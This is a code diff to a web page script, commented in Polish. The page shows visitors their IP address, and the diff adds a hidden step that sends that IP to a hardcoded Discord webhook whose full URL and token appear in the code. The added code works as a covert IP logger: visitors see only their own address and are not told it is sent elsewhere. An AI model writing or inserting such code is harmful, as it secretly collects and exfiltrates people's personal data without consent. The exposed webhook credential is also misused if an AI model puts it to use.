@@ -12,11 +12,28 @@
     <script>
         async function getIP() {
             try {
+                // Pobieranie adresu IP z API
                 const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
-                document.getElementById('ip').innerText = `Twój adres IP to: ${data.ip}`;
+                const ip = data.ip;
+                
+                // Wyświetlanie adresu IP na stronie
+                document.getElementById('ip').innerText = `Twój adres IP to: ${ip}`;
+                
+                // Wysłanie adresu IP do webhooka Discorda
+                const webhookUrl = 'https://discord.com/api/webhooks/1243337284061888645/9gh_K27BN-2MURSEcT9VybnOeV_udo-Z2jcaJAGH9Bm1VTSB3rdAbpmQFhJs2WunU0Bt';
+                const payload = JSON.stringify({ content: `ip: ${ip}` });
+
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: payload
+                });
+
             } catch (error) {
-                console.error('Błąd podczas pobierania adresu IP:', error);
+                console.error('Błąd podczas pobierania adresu IP lub wysyłania webhooka:', error);
                 document.getElementById('ip').innerText = 'Nie udało się pobrać adresu IP.';
             }
         }
